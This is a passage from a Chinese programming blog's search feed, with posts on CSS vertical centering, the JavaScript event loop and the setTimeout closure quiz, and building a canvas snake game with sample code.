class="line">    <span class="attribute">min-height</span>:<span class="number">100vh</span>;</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">    <span class="attribute">margin</span>:auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Flexbox还有一个好处就是，它可以将匿名容器（即使没有节点包裹的文本节点）垂直居中.<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">main</span>&gt;</span>center me，place！<span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>借助Flexbox规范所吸引人的<code>align-items</code>和<code>justify-content</code>属性，我们可以让它内部文本也实现居中<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:flex;</span><br><span class="line">    <span class="attribute">align-items</span>:center;</span><br><span class="line">    <span class="attribute">justify-content</span>:center;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">18em</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">10em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="把所有的东西都对齐吧！"><a href="#把所有的东西都对齐吧！" class="headerlink" title="把所有的东西都对齐吧！"></a>把所有的东西都对齐吧！</h1><p>根据盒对齐模型（第三版）的计划，在未来，对于简单的垂直居中的要求，我们完全不需要动用特殊的布局模式.我们只需要这行代码就可以搞定<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">align-self</span><span class="selector-pseudo">:center</span>;</span><br></pre></td></tr></table></figure></p><p>不知不觉间，我们身边的浏览器都开始让它成为现实（但是路途还很遥远：IE10及更早版本不支持，Safari 7.0 及更早版本使用-webkit前缀）</p><p><img src="http://www.chenqaq.com/assets/images/hack.png" alt="align-self:center"></p><p>参考</p><ul><li><p>《CSS Secrets 》</p></li><li><p>CSS-tricks：<a href="https://css-tricks.com/centering-in-the-unknown/" target="_blank" rel="noopener">https://css-tricks.com/centering-in-the-unknown/</a></p></li><li><p>CSS变形：<a href="http://w3.org/TR/css-transforms" target="_blank" rel="noopener">http://w3.org/TR/css-transforms</a></p></li><li><p>CSS值与单位：<a href="http://w3.org/TR/css-values" target="_blank" rel="noopener">http://w3.org/TR/css-values</a></p></li><li><p>CSS伸缩盒布局模型：<a href="http://w3.org/TR/css-flexbox" target="_blank" rel="noopener">http://w3.org/TR/css-flexbox</a></p></li><li><p>CSS盒对齐模型：<a href="http://w3.org/TR/css-align" target="_blank" rel="noopener">http://w3.org/TR/css-align</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> HTML/CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> layout </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同步、异步、回调执行顺序经典闭包setTimeout分析</title>
      <link href="/2017/12/06/js-setTimeout/"/>
      <url>/2017/12/06/js-setTimeout/</url>
      
        <content type="html"><![CDATA[<h1 id="聊聊同步、异步和回调"><a href="#聊聊同步、异步和回调" class="headerlink" title="聊聊同步、异步和回调"></a>聊聊同步、异步和回调</h1><p>同步，异步，回调，我们傻傻分不清楚，</p><p>有一天，你找到公司刚来的程序员小T，跟他说：“我们要加个需求，你放下手里的事情优先支持，我会一直等你做完再离开”。小T微笑着答应了，眼角却滑过一丝不易觉察的杀意。</p><p>世界上的所有事情大致可以分为同步去做和异步去做两种。你打电话去订酒店，电话另一边的工作人员需要查下他们的管理系统才能告诉你有没有房间。</p><p>这时候你有两种选择：一种是不挂电话一直等待，直到工作人员查到为止（可能几分钟也可能几个小时，取决于他们的办事效率），这就是同步的。</p><p>另一种是工作人员问了你的联系方式就挂断了电话，等他们查到之后再通知你，这就是异步的，这时候你就可以干点其他事情，比如把机票也定了之类的</p><blockquote><p> 计算机世界也是如此，我们写的代码需要交给cpu去处理，这时候就有同步和异步两种选择。js是单线程的，如果所有的操作（<code>ajax</code>,获取文件等I/O操作<code>&lt;node&gt;</code>）都是同步的，遇到哪些耗时的操作，后面的程序必然被阻塞而不能执行，页面也就失去了响应，</p></blockquote><blockquote><p>因此js采用了事件驱动机制，在单线程模型下，使用异步回调函数的方式来实现非阻塞的IO操作，<br><a id="more"></a><br>那么什么是异步任务呢？（参考阮一峰老师《JavaScript运行机制》）</p></blockquote><p>异步任务也就是 指主线程（stack栈）运行的过程中，当stack空闲的时候，主线程对event queque（队列）轮询(事实上一直在轮询)后，将异步任务放到stack里面进行执行；</p><p><img src="http://www.chenqaq.com/assets/images/event.png" alt="（上图转引自Philip Roberts的演讲《Help, I&#39;m stuck in an event-loop》））"></p><p> 简单的说，如果我们指定过回调函数，那么当事件发生时就会进入事件队列，等待主线程的<code>stack</code>空闲的时候，就会对<code>event queue</code>里面的回调读取并放到<code>stack</code>里面执行</p><p>我们经常说的可能是异步回调（当然也有同步回调），所以也就并不难理解，回调和异步之间其实并没有直接的联系，回调只是异步的一种实现方式， </p><p>通过这样的<code>event loop</code>我们其实可以分析出三者的执行顺序，即 <code>同步 &gt; 异步 &gt; 回调</code></p><h1 id="经典闭包setTimeout分析"><a href="#经典闭包setTimeout分析" class="headerlink" title="经典闭包setTimeout分析"></a>经典闭包setTimeout分析</h1><p>今天同学问了我一个问题，我一看是一道经典的面试题，问题如下：</p><p><img src="http://www.chenqaq.com/assets/images/questions.png" alt="question"></p><p>简单的这个问题改一下：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">     setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.log( i );</span><br><span class="line">     &#125;, i*<span class="number">1000</span>);</span><br><span class="line">      <span class="built_in">console</span>.log( <span class="string">' i : '</span> , i );</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">console</span>.log( i );</span><br></pre></td></tr></table></figure></p><p>相信我们很多人都遇到过这个问题，心中或许都有答案：</p><p><img src="http://www.chenqaq.com/assets/images/results.png" alt="result"></p><p>那么为什么并不是入门者心中所想要的结果嘞(为什么<code>setTimeout</code>中打印出<code>i</code>全部是<code>6</code>，而且是最后才打印出来呢)？</p><p>那么就让我们来梳理一下，第一部分<code>event loop</code>图片很直观的体现：”任务队列”可以放置异步任务的事件，也可以放置定时事件（<code>setTimeout</code>和<code>setinterval</code>），即指定某些代码在多少时间之后执行；</p><p> 1、首先我们先来看一下他的主体结构：<code>for</code>循环的第一层是<code>setTimeout</code>函数，<code>setTimeout</code>函数中使用了一个匿名（回调）函数</p><p> 2、还记的我们之前总结的执行顺序：同步 &gt; 异步 &gt; 回调 吧！</p><p>　   for循环和外层的 <code>console.log()</code>是同步的，<code>setTimeout</code>是回调执行，</p><blockquote><p>所以按照执行顺序，先执行for循环，然后进入for循环中，他发现了一个<code>setTimeout()</code>回调(进入<code>event queque</code>事件队列，等待<code>stack</code>栈为空后读取并放入栈中后执行)，</p></blockquote><blockquote><p>这时候他并不会等待，而是继续执行 –&gt; for循环内部的  <code>console.log( &#39; i : &#39; , i )</code>  –&gt;  for循环外部的<code>console.log( i )</code> ，然后”任务队列”中的回调函数才进入到空<code>Stack</code>中开始执行；</p></blockquote><p> 我们在来用这个例子尝试一下上面的event loop图，更加直观的感受一下：</p><p> <img src="http://www.chenqaq.com/assets/images/eventMe.png" alt=""></p><p> 那么接下来可能会问怎么解决这个问题呢？我想最简单的当然是<code>let</code>语法了，</p> <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log( i );</span><br><span class="line">      &#125;, i*<span class="number">1000</span>);</span><br><span class="line">      <span class="built_in">console</span>.log( <span class="string">' 1 : '</span> , i );</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"> <span class="built_in">console</span>.log( i );</span><br></pre></td></tr></table></figure><p> 我们都知道<code>es5</code>中变量作用域是函数，而<code>es6</code>却可以使用<code>let</code>声明一个具有块级作用域的i，在这里也就是<code>for</code>循环体；</p><p>在这里<code>let</code>本质上就是形成了一个闭包，那么写成<code>es5</code>的形式其实等价于：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> loop = <span class="function"><span class="keyword">function</span> (<span class="params">_i</span>) </span>&#123;</span><br><span class="line">     setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.log( _i);</span><br><span class="line">     &#125;, _i*<span class="number">1000</span>);</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">'2：'</span>,_i)  </span><br><span class="line"> &#125;; </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _i = <span class="number">0</span>; _i &lt;= <span class="number">5</span>; _i++) &#123;  </span><br><span class="line">      loop(_i); </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>到这里，我们就完成了从同步、异步、回调的机制分析 到 setTimeout的经典案例的分析，JavaScript博大精深，我们需要了解他的机制去深入去挖掘他。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
            <tag> 运行机制 </tag>
            
            <tag> event queue </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手起刀落-一起写经典的贪吃蛇游戏</title>
      <link href="/2017/12/05/js-snakey/"/>
      <url>/2017/12/05/js-snakey/</url>
      
        <content type="html"><![CDATA[<h1 id="回味"><a href="#回味" class="headerlink" title="回味"></a>回味</h1><p>小时候玩的经典贪吃蛇游戏我们印象仍然深刻，谋划了几天，小时候喜欢玩的游戏，长大了终于有能力把他做出来(从来都没有通关过，不知道自己写的程序，是不是能通关了…)，好了，闲话不多谈，先来看一下效果吧！！</p><p><img src="http://www.chenqaq.com/assets/images/4tjOY7QXHK.gif" alt="效果图"></p><p>功能和小时候玩的贪吃蛇一样，</p><blockquote><p>   1.选择速度 ：<br>       slow<br>       normal<br>       fast</p></blockquote><blockquote><p>   2.选择是否有墙作为障碍物：<br>       on<br>       off</p></blockquote><p>看完效果就先附上地址喽：<a href="https://github.com/okaychen/practice" target="_blank" rel="noopener">大山深处修炼的小龙虾</a>，欢迎fork.<br><a id="more"></a></p><h1 id="结构分解"><a href="#结构分解" class="headerlink" title="结构分解"></a>结构分解</h1><p>如果构建一个简单的经典贪吃蛇游戏呢？我们根据面板可以分解出如下结构：</p><p><img src="http://www.chenqaq.com/assets/images/snake1.png" alt="面板结构分解"></p><p>因为其他面板比较简单，我们重点来看一下游戏面板</p><h2 id="游戏面板"><a href="#游戏面板" class="headerlink" title="游戏面板"></a>游戏面板</h2><p>游戏面板是核心，在游戏面板中，我们来分解一下游戏面板我们需要的因素：</p><p><img src="http://www.chenqaq.com/assets/images/snake2.png" alt=""></p><h3 id="场景、snake、食物"><a href="#场景、snake、食物" class="headerlink" title="场景、snake、食物"></a>场景、snake、食物</h3><p>首先我们需要一个游戏场景、snake、食物这些基础设施<br>   这里使用canvas作为我们的整个游戏的场景：<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;canvas <span class="attribute">class</span>=<span class="string">"wrap"</span> <span class="attribute">id</span>=<span class="string">"snake"</span> <span class="attribute">width</span>=<span class="string">"400"</span> <span class="attribute">height</span>=<span class="string">"400"</span> <span class="attribute">tabindex</span>=<span class="string">"1"</span>&gt;&lt;/canvas&gt;</span><br></pre></td></tr></table></figure></p><p>需要一只snake,后面初始化他的位置<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> activeDot = <span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    ctx.fillStyle = <span class="string">"#eee"</span>;</span><br><span class="line">    ctx.fillRect(x * <span class="number">10</span>, y * <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>需要食物作为对象(关于食物我们需要定义一些规则，如食物的产生)<br><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">var food = &#123;</span><br><span class="line"><span class="symbol">    x:</span> <span class="number">0</span>,</span><br><span class="line"><span class="symbol">    y:</span> <span class="number">0</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>规则是游戏的核心</p><p>关于游戏的规则</p><p>snake的方向控制：(使用键盘的上下左右键控制蛇的方向)<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// changer dir</span></span><br><span class="line">   <span class="keyword">var</span> changeDir = <span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (key == <span class="number">38</span> &amp;&amp; snake_dir != <span class="number">2</span>) &#123;</span><br><span class="line">           snake_next_dir = <span class="number">0</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (key == <span class="number">39</span> &amp;&amp; snake_dir != <span class="number">3</span>) &#123;</span><br><span class="line">               snake_next_dir = <span class="number">1</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (key == <span class="number">40</span> &amp;&amp; snake_dir != <span class="number">0</span>) &#123;</span><br><span class="line">                   snake_next_dir = <span class="number">2</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">if</span> (key == <span class="number">37</span> &amp;&amp; snake_dir != <span class="number">1</span>) &#123;</span><br><span class="line">                       snake_next_dir = <span class="number">3</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>关于食物，如果食物被吃掉，我们就需要产生新的食物<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// add food</span></span><br><span class="line">  <span class="keyword">var</span> addFood = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      food.x = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * ((canvas.width / <span class="number">10</span>) - <span class="number">1</span>));</span><br><span class="line">      food.y = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * ((canvas.height / <span class="number">10</span>) - <span class="number">1</span>));</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; snake.length; i++) &#123;</span><br><span class="line">          <span class="comment">// 如果食物被吃就增加食物</span></span><br><span class="line">          <span class="keyword">if</span> (checkBlock(food.x, food.y, snake[i].x, snake[i].y)) &#123;</span><br><span class="line">              addFood();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> checkBlock = <span class="function"><span class="keyword">function</span> (<span class="params">x, y, _x, _y</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> (x == _x &amp;&amp; y == _y) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>接下来是核心的函数，根据选择的速度和是否有墙体作为障碍物的设置，让蛇运动起来，并且实现</p><blockquote><p>  1、根据选择slow、norma、fast决定蛇运动速度速度;</p></blockquote><blockquote><p>  2、如果蛇碰到自己==自杀，游戏结束</p></blockquote><blockquote><p>  3、有墙模式碰到墙体，游戏结束</p></blockquote><blockquote><p>   4、无墙模式蛇穿过墙体，从另一侧出现</p></blockquote><blockquote><p>   5、使蛇碰到食物就加入自身身体的一部分，执行增加食物函数</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mainLoop = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">var</span> _x = snake[<span class="number">0</span>].x;</span><br><span class="line">       <span class="keyword">var</span> _y = snake[<span class="number">0</span>].y;</span><br><span class="line">       snake_dir = snake_next_dir;</span><br><span class="line">       <span class="comment">//  0 — up  1 — right   2 — down  3 — left</span></span><br><span class="line">       <span class="keyword">switch</span> (snake_dir) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">               _y--;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">               _x++;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">               _y++;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">               _x--;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       snake.pop();</span><br><span class="line">       snake.unshift(&#123;</span><br><span class="line">           x: _x,</span><br><span class="line">           y: _y</span><br><span class="line">       &#125;)</span><br><span class="line"></span><br><span class="line">       <span class="comment">// --wall</span></span><br><span class="line">       <span class="keyword">if</span> (wall == <span class="number">1</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (snake[<span class="number">0</span>].x &lt; <span class="number">0</span> || snake[<span class="number">0</span>].x == canvas.width / <span class="number">10</span> || snake[<span class="number">0</span>].y &lt; <span class="number">0</span> || snake[<span class="number">0</span>].y == canvas.height / <span class="number">10</span>) &#123;</span><br><span class="line">               showScreen(<span class="number">3</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">//  off 无墙</span></span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, x = snake.length; i &lt; x; i++) &#123;</span><br><span class="line">               <span class="keyword">if</span> (snake[i].x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                   snake[i].x = snake[i].x + (canvas.width / <span class="number">10</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (snake[i].x == canvas.width / <span class="number">10</span>) &#123;</span><br><span class="line">                   snake[i].x = snake[i].x - (canvas.width / <span class="number">10</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (snake[i].y &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                   snake[i].y = snake[i].y + (canvas.height / <span class="number">10</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (snake[i].y == canvas.height / <span class="number">10</span>) &#123;</span><br><span class="line">                   snake[i].y = snake[i].y - (canvas.height / <span class="number">10</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//  Autophagy death</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; snake.length; i++) &#123;</span><br><span class="line">           <span class="keyword">if</span> (snake[<span class="number">0</span>].x == snake[i].x &amp;&amp; snake[<span class="number">0</span>].y == snake[i].y) &#123;</span><br><span class="line">               showScreen(<span class="number">3</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Eat food</span></span><br><span class="line">       <span class="keyword">if</span> (checkBlock(snake[<span class="number">0</span>].x, snake[<span class="number">0</span>].y, food.x, food.y)) &#123;</span><br><span class="line">           snake[snake.length] = &#123;</span><br><span class="line">               x: snake[<span class="number">0</span>].x,</span><br><span class="line">               y: snake[<span class="number">0</span>].y</span><br><span class="line">           &#125;;</span><br><span class="line">           score += <span class="number">1</span>;</span><br><span class="line">           altScore(score);</span><br><span class="line">           addFood();</span><br><span class="line">           activeDot(food.x, food.y);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// --------------------</span></span><br><span class="line"></span><br><span class="line">       ctx.beginPath();</span><br><span class="line">       ctx.fillStyle = <span class="string">"#111"</span>;</span><br><span class="line">       ctx.fillRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// --------------------</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; snake.length; i++) &#123;</span><br><span class="line">           activeDot(snake[i].x, snake[i].y);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// --------------------</span></span><br><span class="line"></span><br><span class="line">       activeDot(food.x, food.y);</span><br><span class="line"></span><br><span class="line">       setTimeout(mainLoop, snake_speed);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ok以上展示出一些核心部分，构建出一个舞台中一只小蛇的故事.</p><video controls src="http://gslb.miaopai.com/stream/9Sve8-3osRBmmpEvONt~uKP-WbvOSRLH.mp4?ssig=3a4333a30009844032269e50b9be79b7&time_stamp=1512196508068&cookie_id=&vend=1&os=3&partner=1&platform=2&cookie_id=&refer=miaopai&scid=9Sve8-3osRBmmpEvONt%7EuKP-WbvOSRLH" loop="false" width="100%" height="420">embed: cat.mov</video><p>小时候爸妈手机里有一款小游戏叫贪吃蛇。就是一条小蛇，不停地在屏幕上游走，吃各个方向出现的食物，越吃越长。只要蛇头碰到屏幕四周，或者碰到自己的身子，小蛇就立即毙命。方寸的舞台间，亦有无限精彩；</p><p>PS:到现在也没有通关过..现在不知道能不能通关了…</p><p>最后在附上次源码，欢迎fork交流：<a href="https://github.com/okaychen/practice" target="_blank" rel="noopener">https://github.com/okaychen/practice</a>…<br>因为自己测试用的服务器被占用，目前只有做的效果图供大家参考喽.</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
            <tag> 小游戏 </tag>
            
            <tag> Canvas </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
